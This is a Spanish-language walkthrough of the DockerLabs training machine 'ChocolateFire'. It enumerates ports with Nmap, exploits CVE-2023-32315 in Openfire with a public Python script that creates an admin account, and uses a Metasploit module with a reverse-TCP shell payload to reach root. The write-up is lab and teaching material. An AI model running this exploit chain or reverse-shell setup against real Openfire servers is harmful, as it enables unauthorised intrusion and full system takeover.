![](adjuntos/Pasted%20image%2020260213022119.png)

# ChocolateFire – DockerLabs
> Explotación práctica de la vulnerabilidad CVE-2023-32315 en Openfire que conduce a la ejecución remota de código (RCE) dentro de un entorno contenerizado.

## 1️⃣ Lab Information

- **Plataforma:** [DockerLabs](https://dockerlabs.es)  
- **Tipo de entorno:** Contenedor Docker (backend Podman)  
- **Servicio objetivo:** Openfire  
- **Vulnerabilidad explotada:** CVE-2023-32315  
- **Dificultad:** Media  

### Habilidades demostradas

-  Enumeración (Nmap)  
- Investigación y análisis de vulnerabilidades (CVE)  
- Ejecución remota de código (RCE)  
- Escalada de privilegios en Linux  

## 🐳 2️⃣ Despliegue
La máquina se despliega como contenedor mediante el script proporcionado:
```bash
sudo bash auto_deploy.sh chocolatefire.tar

[+] Image loaded successfully
[+] Container started
[+] Assigned IP: 10.88.0.2
```

## 🔎 3️⃣ Enumeración
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 10.88.0.2

PORT     STATE SERVICE VERSION
22/tcp   open  ssh
5222/tcp open
5223/tcp open
5262/tcp open
5263/tcp open
5269/tcp open
5270/tcp open
5275/tcp open
5276/tcp open
7070/tcp open  http   Servicio alternativo
7777/tcp open
9090/tcp open  http   Openfire Admin Panel
```

## 4️⃣ Análisis del servicio

El puerto **9090/tcp** expone la consola administrativa de **Openfire**.

La interfaz web confirma la presencia de la **Openfire Admin Console**, protegida por autenticación.

📌 Servicio de alto impacto identificado. Se prioriza explotación.

![](adjuntos/Pasted%20image%2020260213030820.png)


## 5️⃣ Identificación y preparación del exploit

Se identifica la vulnerabilidad asociada:

- **CVE-2023-32315**
- Bypass de autenticación en Openfire

Exploit público disponible:

https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

### 5.1🔎 Análisis del exploit

El script explota un fallo en el mecanismo de autenticación de Openfire que permite eludir la validación de credenciales.

El exploit:

- Envía una petición manipulada al endpoint vulnerable.
- Omite el proceso de login.
- Permite ejecutar código arbitrario en el servidor.

📌 Impacto: ejecución remota de código (RCE).

### 5.2🐍 Preparación del entorno

El exploit está desarrollado en Python.  
Se crea un entorno virtual para aislar dependencias y mantener el sistema limpio.
```bash
python3 -m venv openfire_env
```

Una vez creado, se activa el entorno:
```bash
source openfire_env/bin/activate
```

A continuación, se instalan las librerías necesarias para el funcionamiento del exploit:
```bash
pip install requests rich
```

Se crea el archivo local del exploit y se copia el código desde el repositorio identificado:
```bash
nvim CVE-2023-32315.py
```

## 6️⃣ Explotación

Se ejecuta el exploit contra la consola administrativa:

```bash
python3 CVE-2023-32315.py -u http://10.88.0.2:9090
```

El exploit confirma la vulnerabilidad y genera credenciales administrativas:
```bash
[*] Launching exploit against: http://10.88.0.2:9090
[+] Target is vulnerable
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW
```

## 7️⃣ Validación de acceso

Tras la ejecución del exploit, se accede a la consola administrativa con las credenciales generadas:

- Usuario: hugme  
- Contraseña: HugmeNOW 

Se confirma la creación del nuevo usuario con privilegios administrativos dónde se demuestra el control total sobre la instancia de Openfire.

![](adjuntos/Pasted%20image%2020260213034537.png)


## 8️⃣ Obtención de shell en el sistema

Tras confirmar la vulnerabilidad, se procede a la explotación mediante el módulo oficial de Metasploit, configurando un payload de tipo reverse shell para establecer una conexión interactiva con el sistema objetivo:

Abrimos Metasploit:
```bash
msfconsole
```

Identificación del módulo asociado a la CVE:
```bash
search CVE-2023-32315
```

Inicialización del módulo y configuración del payload:
```bash
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```

Se procede a validar los parámetros obligatorios del módulo previo a la explotación:
```bash
show options
```

Se confirman los parámetros obligatorios del módulo antes de la ejecución:

![](adjuntos/Pasted%20image%2020260213040718.png)

Se parametriza el módulo con los valores requeridos para establecer la reverse shell:
```bash
set RHOSTS 10.88.0.2
set RPORT 9090
set PAYLOAD java/shell/reverse_tcp
set LHOST 10.88.0.1
set LPORT 4444
```

Se ejecuta el módulo tras configurar los parámetros requeridos:
```bash
run
```

![](adjuntos/Pasted%20image%2020260213041738.png)

 🔐 Validación de privilegios:
 ```bash
 whoami
 root
 ```

Se ha logrado ejecución remota de código mediante la explotación de **CVE-2023-32315**, obteniendo acceso directo al sistema con privilegios **root**.

🎯 **Compromiso total del contenedor completado.**